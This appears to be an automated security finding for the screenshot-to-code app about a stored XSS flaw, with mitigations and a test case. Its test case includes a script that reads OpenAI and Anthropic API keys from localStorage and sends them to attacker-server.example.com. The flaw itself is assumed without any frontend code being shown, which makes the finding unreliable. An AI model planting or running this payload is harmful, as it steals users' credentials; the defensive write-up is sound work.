- Vulnerability Name: Stored Cross-Site Scripting (XSS) leading to API Key Theft
- Description:
    - An attacker could exploit a Stored Cross-Site Scripting (XSS) vulnerability in the React frontend of the application.
    - The attacker injects malicious JavaScript code into a data field that is later displayed to other users within the application's frontend.
    - When another user views the page containing the attacker's malicious code, their browser executes the injected script.
    - This malicious script can access sensitive data within the user's browser context, such as localStorage or cookies where the application might store API keys.
    - Specifically, the script is designed to steal the user's OpenAI or Anthropic API keys, which are assumed to be stored client-side after configuration in the application's settings dialog.
    - The stolen API keys are then sent to an attacker-controlled external server, allowing the attacker to use them for malicious purposes.
- Impact:
    - Successful exploitation of this vulnerability allows an attacker to steal a user's OpenAI or Anthropic API keys.
    - With stolen API keys, the attacker can:
        - Make unauthorized requests to the OpenAI or Anthropic AI models, potentially incurring financial costs for the victim through their API accounts.
        - Access the AI models for their own malicious purposes, potentially including sensitive data processing if the context allows.
        - Disrupt the victim's access to the AI model services by exhausting their API credits or through other means.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - Based on the provided backend code, there are no explicit mitigations implemented within the project to prevent Stored XSS in the frontend.
    - The backend code focuses on processing API keys and generating code using AI models but does not include input sanitization or output encoding for the frontend to prevent XSS attacks.
- Missing Mitigations:
    - **Input Sanitization and Output Encoding in React Frontend:** The React frontend must implement robust input sanitization to prevent users from injecting malicious scripts. Additionally, output encoding should be applied when rendering user-supplied data to prevent the browser from executing any injected scripts.
    - **Secure API Key Storage in Frontend:** The application should avoid storing API keys in easily accessible client-side storage mechanisms like localStorage if possible. If client-side storage is necessary, consider:
        - Encryption of API keys before storing them.
        - Using secure cookies with `HttpOnly` and `Secure` flags to limit JavaScript access and ensure transmission only over HTTPS.
    - **Content Security Policy (CSP):** Implement a Content Security Policy to restrict the sources from which the browser is allowed to load resources (scripts, stylesheets, images, etc.). A properly configured CSP can significantly reduce the impact of XSS attacks by preventing the execution of unauthorized scripts.
- Preconditions:
    - The React frontend of the application must contain a Stored XSS vulnerability, meaning it must be possible for an attacker to inject and store malicious JavaScript code.
    - Users of the application must configure their OpenAI or Anthropic API keys using the settings dialog within the frontend.
    - The application must store these API keys in a client-side storage mechanism (e.g., localStorage, cookies) that is accessible by JavaScript.
- Source Code Analysis:
    - **Backend `routes/generate_code.py`:**
        - The function `get_from_settings_dialog_or_env(params, "openAiApiKey", OPENAI_API_KEY)` in `backend/routes/generate_code.py` retrieves the OpenAI API key from the `params` dictionary, which is populated from the JSON payload received via WebSocket from the frontend.
        - Similarly, it retrieves `anthropicApiKey`.
        - This indicates that the frontend is designed to send API keys to the backend as part of the application's workflow.
        - The function `extract_params` further processes these parameters.
        - The keys are used in functions like `stream_openai_response` and `stream_claude_response` to interact with AI models.
        - **Absence of Frontend Code:**  The provided project files do not include the React frontend code. Therefore, a direct source code analysis for XSS vulnerabilities in the frontend is not possible. However, based on the backend code and the project description, it is inferred that:
            - The React frontend likely has a settings dialog where users can input their OpenAI and Anthropic API keys.
            - These API keys are then transmitted to the backend, and potentially stored or used within the frontend as well for subsequent sessions, making them a target for XSS attacks.
- Security Test Case:
    1. **Setup:**
        - Deploy an instance of the `screenshot-to-code` application, making it publicly accessible for testing.
        - Configure the backend with valid (but test or limited) OpenAI and Anthropic API keys for demonstration purposes.
    2. **Identify XSS Vulnerable Input (React Frontend - Assumed):**
        - Since frontend code is not provided, we assume there is an input field (e.g., a text field in settings, comment section if exists, or similar user-editable content area in the React frontend) that is susceptible to Stored XSS. Let's assume a hypothetical vulnerable input field in a 'Project Description' feature, if it existed in frontend.
    3. **Inject Malicious XSS Payload:**
        - As an attacker, access the assumed vulnerable input field in the React frontend (e.g., 'Project Description').
        - Inject the following malicious JavaScript code as input:
            ```html
            <script>
            window.onload = function() {
                var openAiKey = localStorage.getItem('openAiApiKey');
                var anthropicKey = localStorage.getItem('anthropicApiKey');
                if (openAiKey || anthropicKey) {
                    fetch('https://attacker-server.example.com/collect-keys?openai=' + openAiKey + '&anthropic=' + anthropicKey, {
                        mode: 'no-cors' // Use no-cors to avoid CORS issues with attacker server
                    });
                }
            };
            </script>
            ```
            *(Note: This payload is crafted under the assumption that API keys are stored in `localStorage` with keys 'openAiApiKey' and 'anthropicApiKey'. The actual storage mechanism needs to be verified in the real frontend code.)*
            - Replace `https://attacker-server.example.com/collect-keys` with a URL for an attacker-controlled server that can log incoming requests.
    4. **Trigger Stored XSS:**
        - As a legitimate user, or even the attacker using a different browser session to simulate another user, navigate to the part of the application where the 'Project Description' (or the assumed vulnerable content) is displayed. This action triggers the rendering of the attacker's stored malicious script in the browser.
    5. **Verify API Key Theft on Attacker Server:**
        - Check the logs of the attacker's server (`attacker-server.example.com`).
        - If the XSS is successful and the API keys are accessible and being sent, the server logs should contain entries for requests to `/collect-keys` with the stolen `openai` and `anthropic` API keys as query parameters.
        - The `mode: 'no-cors'` in the `fetch` API is used to bypass potential CORS restrictions when sending the stolen keys to a third-party server, although it might limit the attacker's ability to receive response data.
